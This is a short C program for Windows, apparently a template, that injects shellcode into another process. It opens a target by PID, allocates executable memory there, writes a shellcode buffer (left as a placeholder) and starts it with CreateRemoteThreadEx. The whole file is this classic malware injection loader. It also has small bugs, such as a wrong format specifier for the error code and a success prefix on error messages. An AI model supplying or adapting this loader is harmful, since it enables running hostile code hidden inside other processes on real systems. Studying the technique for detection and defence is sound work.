#include <stdio.h>
#include <Windows.h>

DWORD PID = NULL, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;

const char * k = "[+]";
const char * i = "[+]";
const char * e = "[+]";

unsigned char shellCode[] = "<YOUR SHELLCODE HERE>";


int main(int argc, char * argv[]) {

    if (argc < 2){
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    printf("%s is trying to open a handle (%ld)\n", i, PID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (hProcess == NULL){
        printf("%s hProcess returned a NULL (%ld) ERROR:%ls", e, PID, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the process %ld!\n\\---0x%p\n",k , PID, hProcess);

    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof (shellCode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    printf("%s allocate %zu bytes with rwx permissions\n",k, sizeof(shellCode));

    WriteProcessMemory(hProcess, rBuffer, shellCode, sizeof (shellCode), NULL);
    printf("%s written %zu bytes to process memory\n",k, sizeof(shellCode));

    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
 
    if (hThread == NULL){
        printf("%s somthing bad happend ERROR:%ld\n", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the process %ld!\n\\---0x%p\n",k , PID, hThread);

    printf("Cleaning Up\n");
    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("All processes complete!\n");

    return EXIT_SUCCESS;
}
